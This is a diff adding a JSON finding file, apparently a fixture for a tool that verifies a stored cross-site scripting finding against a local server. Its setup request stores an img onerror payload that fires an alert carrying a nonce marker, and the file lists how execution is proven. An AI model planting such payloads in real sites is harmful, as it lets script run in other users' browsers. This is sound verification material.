@@ -1,0 +1,49 @@
+{
+  "finding_id": "GHSA-v82v-c5x8-w282",
+  "type": "xss.stored",
+  "target": {
+    "expected_origin": "http://127.0.0.1:8088",
+    "allowed_hosts": [
+      "127.0.0.1"
+    ],
+    "allowed_schemes": [
+      "http"
+    ],
+    "allowed_ports": [
+      8088
+    ]
+  },
+  "auth": {
+    "required": false
+  },
+  "evidence": {
+    "setup": [
+      {
+        "method": "POST",
+        "url": "http://127.0.0.1:8088/store",
+        "headers": [
+          {
+            "name": "content-type",
+            "value": "application/json"
+          }
+        ],
+        "body": "{\"content\":\"Stored note: <img src=x onerror=\\\"alert('VERIFIER_STORED_{{nonce}}')\\\">\"}"
+      }
+    ],
+    "trigger": {
+      "method": "GET",
+      "url": "http://127.0.0.1:8088/note"
+    },
+    "vulnerable_parameter": "content",
+    "payload_marker": "VERIFIER_STORED_{{nonce}}"
+  },
+  "proof": {
+    "accepted_signals": [
+      "javascript_dialog",
+      "console_log"
+    ],
+    "expected_message_contains": "VERIFIER_STORED_{{nonce}}",
+    "expected_execution_origin": "http://127.0.0.1:8088",
+    "timeout_ms": 12000
+  }
+}
